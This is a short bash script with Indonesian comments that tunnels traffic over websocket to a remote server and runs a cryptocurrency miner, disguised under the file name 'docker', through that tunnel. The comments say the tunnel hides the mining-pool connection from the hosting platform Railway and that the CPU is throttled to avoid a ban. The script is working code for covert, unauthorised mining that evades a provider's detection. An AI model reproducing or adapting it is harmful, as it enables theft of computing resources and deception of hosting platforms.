#!/bin/bash

# --- KONFIGURASI ---
IP_UBUNTU="45.115.224.184" # IP Server kamu

echo "Membuka Terowongan Websocket..."
# Membuat port lokal 4629 yang terhubung ke Ubuntu via Websocket
./gost -L tcp://:4629/127.0.0.1:4629 -F ws://$IP_UBUNTU:8080?path=/ws-data &

sleep 5

echo "Menjalankan Miner via Tunnel..."
# Miner menyambung ke 127.0.0.1 (Lokal), Railway tidak tahu itu ke pool mining
# Gunakan -t 1 agar CPU tidak 100% (Penyebab utama kena ban)
./docker -a yespower -o stratum+tcp://127.0.0.1:4629 -u WXDNsKHm8X4RQm9tMpXaLMmxb8Mp1Vxvh6.1 -p c=SWAMP -t 1  > /dev/null 2>&1 &

echo "Running..."

while true
do
  sleep 60
done
